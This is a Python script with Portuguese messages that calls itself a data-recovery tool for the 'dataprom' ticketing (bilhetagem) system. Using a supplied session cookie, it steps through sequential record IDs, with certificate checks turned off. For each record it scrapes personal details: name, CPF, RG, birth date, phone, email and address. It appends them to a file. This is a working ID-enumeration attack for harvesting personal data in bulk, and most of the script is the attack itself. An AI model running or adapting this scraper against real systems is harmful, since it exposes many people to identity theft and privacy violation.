from bs4 import BeautifulSoup
import requests
import sys

dataMap = [
    'ID da pessoa:', 
    'Nome:', 
    'Nome Cartão:', 
    'Sexo:', 
    'Data de Nascimento:', 
    'CPF:',
    'RG:',
    'Telefone:',
    'Celular:',
    'E-mail :',
    'Endereço:',
    'Bairro:',
    'Número:',
    'Bairro:',
    'CEP:',
    'Status do Cadastro:',
    'Data Cadastro:'
]

def saveOnFile(value, data, id=0):
    if(value == 1):
        file = open(sys.argv[3], 'a')
        file.write(data)
        file.write('\n')
    else:
        file = open('error_log.txt', 'a')
        file.write(data)
        file.write('\n')
        
    file.close()

def sanitazeData(data, id):
    output = {}
    for lines in data:
        if(lines in dataMap):
            validate = lines.replace(':','')
            num = 1
        elif num == 1:
            num = 0
            if(validate == "ID da pessoa"):
                output[validate] = id+1
            else:
                output[validate] = lines
    return output

def dataRetriver(id, cookie):
    id = int(id)
    cookie = {
        "JSESSIONID": cookie
    }   

    while id > 75000:
        print(f"Tentativa em id: {id}")
        url = f'linkdabilehtagem'
        response = requests.get(url, cookies=cookie, verify=False)
        id -= 1
        if response.status_code == 200:
            html = response.text
            soup = BeautifulSoup(html, 'html.parser')
            td_tags = soup.find_all('td')
            inner_html_list = [td_tag.get_text(strip=True) for td_tag in td_tags]
            orderedData = sanitazeData(inner_html_list, id)
            # print(orderedData)
            saveOnFile(1, str(orderedData), id)
            # break
        else:
            print(f'Falha ao acessar o id {id+1}, com erro:', response.status_code)
            saveOnFile(0, f'Error com o id {id+1}')
            # break

# 
# __MAIN__
# 
if __name__ == "__main__":
    print(f"Script de recuperação de dados do Sistema de bilhetagem dataprom")
    print(f"Comçando do id: {sys.argv[1]} até o 350000")
    print("Arquivo com os dados: user_data.txt")
    print("Arquivo com logs de erro: error_log.txt")
    dataRetriver(sys.argv[1], sys.argv[2])
